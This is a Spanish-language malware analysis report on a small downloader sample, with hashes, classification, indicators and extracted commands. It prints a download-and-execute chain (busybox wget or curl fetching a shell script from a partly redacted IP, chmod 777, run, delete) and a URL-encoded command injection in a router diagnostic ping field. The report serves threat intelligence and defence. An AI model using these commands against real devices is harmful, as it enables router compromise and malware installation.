# 🧬 Payload Analysis

`f1483e08bc3fa836485f4802c4b880bdf5d797a4f28dc9c334ea052b60a9484e`

## 📌 Resumen

Texto ASCII de 461 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.gpon`
5. `rm -f .s`
6. `wget hxxp://91.92.40.XXX/wget` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/f1483e08bc3fa836485f4802c4b880bdf5d797a4f28dc9c334ea052b60a9484e.md](../../../../../malware-like/oraculo/downloader/f1483e08bc3fa836485f4802c4b880bdf5d797a4f28dc9c334ea052b60a9484e.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f1483e08bc3fa836485f4802c4b880bdf5d797a4f28dc9c334ea052b60a9484e`
- **SHA1:** `805b4b4a4d7e35649fe5a1e5a818e5086c724e77`
- **MD5:** `c1c88584dca1a5b4dcdc4527f04851d0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (301), with CRLF line terminators |
| Tamaño | 461 B |
| Entropía | 5.28 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (301), with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%60cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.gpon%3Brm%20-f%20.s%60&ipv=0 | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%60cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget | strings |
| hash | f1483e08bc3fa836485f4802c4b880bdf5d797a4f28dc9c334ea052b60a9484e | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
